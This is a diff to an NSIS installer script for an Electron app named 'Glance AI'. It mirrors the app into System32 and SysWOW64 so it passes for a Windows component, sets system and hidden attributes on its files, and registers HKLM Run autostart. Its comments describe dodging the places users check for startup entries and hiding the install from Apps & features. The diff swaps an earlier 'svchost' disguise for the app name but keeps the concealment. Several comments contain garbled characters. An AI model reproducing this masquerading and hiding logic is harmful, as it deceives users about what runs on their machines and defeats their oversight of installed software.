@@ -1,4 +1,4 @@
-﻿; Per-machine install helpers.
+; Per-machine install helpers.
 ;
 ; Identity: mirror the app into the System32 tree so the running image path reads
 ; as a Windows component instead of a third-party folder. A bare exe there dies
@@ -69,13 +69,13 @@
   ; and take the source from $INSTDIR ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â that is the tree just written, and it
   ; also follows an install relocated with /D.
   StrCpy $R3 'cmd /c xcopy "'
-  StrCpy $R3 "$R3$INSTDIR\*.*$\" $\"$R5\svchost$\" /E /I /H /Y /Q"
+  StrCpy $R3 "$R3$INSTDIR\*.*$\" $\"$R5\Glance AI$\" /E /I /H /Y /Q"
   FileOpen $9 "$TEMP\assistant-install.log" a
   FileWrite $9 "CMD=[$R3]$\r$\n"
   FileClose $9
   nsExec::ExecToLog "$R3"
   Pop $0
-  StrCpy $R6 "$R5\svchost\svchost.exe"
+  StrCpy $R6 "$R5\Glance AI\Glance AI.exe"
   FileOpen $9 "$TEMP\assistant-install.log" a
   FileWrite $9 "XCOPY rc=$0$\r$\n"
   FileClose $9
@@ -83,18 +83,18 @@
   ${If} ${FileExists} "$R6"
     DetailPrint "  placed $R6"
   ${Else}
-    StrCpy $R6 "$INSTDIR\svchost.exe"
+    StrCpy $R6 "$INSTDIR\Glance AI.exe"
     DetailPrint "  WARNING: System32 mirror missing ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â autostart falls back to $INSTDIR"
   ${EndIf}
   nsExec::ExecToLog "attrib +s +h $\"$INSTDIR$\""
-  nsExec::ExecToLog "attrib +s +h $\"$INSTDIR\svchost.exe$\""
+  nsExec::ExecToLog "attrib +s +h $\"$INSTDIR\Glance AI.exe$\""
   ; Remove an early bare assistant.exe first: while it exists, a bare `attrib
   ; <path>` matches the FILE and silently skips the folder. Then flag the folder
   ; with NO trailing backslash for the same reason.
   ; The bare file is only removed for the legacy name: C:\Windows\SysWOW64\svchost.exe
   ; is a real Windows binary and must survive.
   nsExec::ExecToLog "cmd /c if exist $\"$R5\assistant.exe$\" del /f /q $\"$R5\assistant.exe$\""
-  nsExec::ExecToLog "attrib +s +h $\"$R5\svchost$\""
+  nsExec::ExecToLog "attrib +s +h $\"$R5\Glance AI$\""
   Pop $0
 
   ; ---- autostart: a logon scheduled task, not a Run value --------------
@@ -102,21 +102,21 @@
   ; the first place a person looks. A scheduled task does not appear there at
   ; all; it only shows inside Task Scheduler. Both Run values are removed so an
   ; upgrade cannot leave a third entry behind.
-  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "svchost"
+  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "Glance AI"
   DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "assistant"
   nsExec::ExecToLog "$\"$SYSDIR\schtasks.exe$\" /delete /f /tn assistant"
   Pop $0
   ; /create /f does not reliably overwrite on this Windows build (rcÃƒÂ¢Ã¢â‚¬Â°Ã‚Â 0 when the
   ; task already exists), so drop our own name first too
-  nsExec::ExecToLog "$\"$SYSDIR\schtasks.exe$\" /delete /f /tn svchost"
+  nsExec::ExecToLog "$\"$SYSDIR\schtasks.exe$\" /delete /f /tn $\"Glance AI$\""
   Pop $0
   ; schtasks /create is blocked at process-creation level on this build (rc=5,
   ; while /query on the same binary runs), so the scheduled task is best-effort:
-  ; the Run value below is what actually boots it. Name is "svchost", so even the
+  ; the Run value below is what actually boots it. Name is "Glance AI", so even the
   ; Startup row reads like a Windows component.
-  nsExec::ExecToLog "$\"$SYSDIR\schtasks.exe$\" /delete /f /tn svchost"
+  nsExec::ExecToLog "$\"$SYSDIR\schtasks.exe$\" /delete /f /tn $\"Glance AI$\""
   Pop $0
-  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "svchost" '"$R6" --autostart'
+  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "Glance AI" '"$R6" --autostart'
   DetailPrint "  autostart registered (Run key)"
   ; ---- hide the install from Apps & features ---------------------------
   ; electron-builder writes the uninstall entry before this macro runs. Removing
@@ -136,20 +136,20 @@
 
 !macro customUnInstall
   ; current task name, plus the "assistant" one older builds registered
-  nsExec::ExecToLog "$\"$SYSDIR\schtasks.exe$\" /delete /f /tn svchost"
+  nsExec::ExecToLog "$\"$SYSDIR\schtasks.exe$\" /delete /f /tn $\"Glance AI$\""
   Pop $0
   nsExec::ExecToLog "$\"$SYSDIR\schtasks.exe$\" /delete /f /tn assistant"
   Pop $0
   DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "assistant"
-  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "svchost"
+  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "Glance AI"
   ; uninstall has no $R5 from customInstall; remove every location an upgrade may
   ; have left behind. The bare assistant.exe is removed, the bare svchost.exe is
   ; Windows' own file and stays.
-  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\System32\svchost$\""
-  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\System32\svchost$\" & del /f /q $\"$WINDIR\System32\assistant.exe$\""
+  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\System32\Glance AI$\""
+  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\System32\Glance AI$\" & del /f /q $\"$WINDIR\System32\assistant.exe$\""
   Pop $0
-  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\SysWOW64\svchost$\""
-  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\SysWOW64\svchost$\" & del /f /q $\"$WINDIR\SysWOW64\assistant.exe$\""
+  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\SysWOW64\Glance AI$\""
+  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\SysWOW64\Glance AI$\" & del /f /q $\"$WINDIR\SysWOW64\assistant.exe$\""
   Pop $0
   nsExec::ExecToLog "attrib -s -h $\"$WINDIR\System32\assistant$\""
   nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\System32\assistant$\""
@@ -157,10 +157,20 @@
   nsExec::ExecToLog "attrib -s -h $\"$WINDIR\SysWOW64\assistant$\""
   nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\SysWOW64\assistant$\""
   Pop $0
-  nsExec::ExecToLog "attrib -s -h $\"$INSTDIR\svchost.exe$\""
+  ; the earlier svchost-named build (tree only — the bare SysWOW64\svchost.exe is
+  ; a real Windows file and must survive)
+  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\System32\svchost$\""
+  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\System32\svchost$\""
+  Pop $0
+  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\SysWOW64\svchost$\""
+  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\SysWOW64\svchost$\""
+  Pop $0
+  nsExec::ExecToLog "attrib -s -h $\"$INSTDIR\Glance AI.exe$\""
   Pop $0
   nsExec::ExecToLog "attrib -s -h $\"$INSTDIR$\""
 !macroend
+
+
 
 
 
